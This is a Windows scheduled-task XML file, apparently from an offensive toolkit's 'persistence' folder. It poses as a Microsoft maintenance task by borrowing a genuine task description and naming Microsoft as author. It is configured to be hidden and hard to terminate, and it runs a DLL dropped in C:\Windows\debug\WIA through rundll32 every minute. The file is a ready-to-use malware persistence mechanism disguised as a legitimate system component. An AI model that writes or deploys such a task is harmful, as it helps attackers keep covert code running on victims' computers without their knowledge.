# persistence/register.xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
    <RegistrationInfo>
        <Date>2022-10-11T13:21:17-08:00</Date>
        <Author>Microsoft</Author>
        <Version>1.0.0</Version>
        <Description>Maintains registrations for background tasks for Universal Windows Platform applications.</Description>
    </RegistrationInfo>
    <Triggers>
    <CalendarTrigger>
            <StartBoundary>2022-10-11T13:21:17-08:00</StartBoundary>
            <EndBoundary>2023-01-01T00:00:00-08:00</EndBoundary>
            <Repetition>
                <Interval>PT1M</Interval>
                <Duration>PT4M</Duration>
            </Repetition>
            <ScheduleByDay>
                <DaysInterval>1</DaysInterval>
            </ScheduleByDay>
        </CalendarTrigger>
    </Triggers>
    <Principals>
        <Principal id="Author">
            <UserId>HOSTNAME_HERE\USER_HERE</UserId>
            <RunLevel>LeastPrivilege</RunLevel>
            <LogonType>InteractiveToken</LogonType>
        </Principal>
    </Principals>
    <Settings>
        <Enabled>true</Enabled>
        <AllowStartOnDemand>false</AllowStartOnDemand>
        <AllowHardTerminate>false</AllowHardTerminate>
        <Hidden>true</Hidden>
    </Settings>
    <Actions Context="Author">
        <Exec>
            <Command>C:\Windows\System32\rundll32.exe C:\Windows\debug\WIA\dbgutil.dll,Update</Command>
        </Exec>
    </Actions>
</Task>